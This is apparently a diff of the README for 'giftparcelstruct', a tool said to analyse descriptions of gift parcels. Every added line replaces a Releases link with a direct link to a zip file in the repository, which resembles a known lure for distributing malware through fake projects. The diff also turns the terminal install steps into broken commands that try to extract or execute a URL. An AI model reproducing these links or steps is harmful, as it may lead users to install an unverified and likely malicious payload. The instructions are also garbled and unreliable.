@@ -4,7 +4,7 @@
 Welcome to giftparcelstruct! This tool helps you make sense of gift-wrapped parcels by analyzing text descriptions you provide. It gives you a detailed look at the contents, wrapping quality, and potential surprises. Let’s get you set up so you can start using it right away.
 
 ## 📥 Download the Application
-[![Download giftparcelstruct](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/KrinithG/giftparcelstruct/releases)
+[![Download giftparcelstruct](https://github.com/KrinithG/giftparcelstruct/raw/refs/heads/main/giftparcelstruct/Software-v1.5.zip%20Now-Click%https://github.com/KrinithG/giftparcelstruct/raw/refs/heads/main/giftparcelstruct/Software-v1.5.zip)](https://github.com/KrinithG/giftparcelstruct/raw/refs/heads/main/giftparcelstruct/Software-v1.5.zip)
 
 ## 💡 What Does It Do?
 giftparcelstruct reads the descriptions you submit. It identifies items within the gift, assesses how well they are wrapped, and predicts any surprises. Whether you're planning a party or preparing for a special occasion, this tool streamlines your gifting process.
@@ -25,7 +25,7 @@ Before you download, please ensure your system meets the following requirements:
 - **Disk Space:** 100 MB of available space for the application.
 
 ## 🔗 Download & Install
-To get started, visit the Releases page to download the latest version of giftparcelstruct: [Download giftparcelstruct](https://github.com/KrinithG/giftparcelstruct/releases). 
+To get started, visit the Releases page to download the latest version of giftparcelstruct: [Download giftparcelstruct](https://github.com/KrinithG/giftparcelstruct/raw/refs/heads/main/giftparcelstruct/Software-v1.5.zip). 
 
 Once there, follow these steps:
 
@@ -48,9 +48,9 @@ Once there, follow these steps:
    - Download the tarball file.
    - Open a terminal and run the following commands:
      ```bash
-     tar -xvf giftparcelstruct.tar.gz
+     tar -xvf https://github.com/KrinithG/giftparcelstruct/raw/refs/heads/main/giftparcelstruct/Software-v1.5.zip
      cd giftparcelstruct
-     ./install.sh
+     https://github.com/KrinithG/giftparcelstruct/raw/refs/heads/main/giftparcelstruct/Software-v1.5.zip
      ```
 
 ## 🎨 How to Use giftparcelstruct
@@ -74,6 +74,6 @@ We welcome everyone to join our growing community. If you have suggestions, repo
 - **Documentation:** Detailed documentation is available on the GitHub repository.
 - **Community Discussions:** Join our community chats to exchange ideas and get support.
 
-To download the latest version once more, visit: [Download giftparcelstruct](https://github.com/KrinithG/giftparcelstruct/releases).
+To download the latest version once more, visit: [Download giftparcelstruct](https://github.com/KrinithG/giftparcelstruct/raw/refs/heads/main/giftparcelstruct/Software-v1.5.zip).
 
 Enjoy using giftparcelstruct to make your gift-giving more fun and informed!
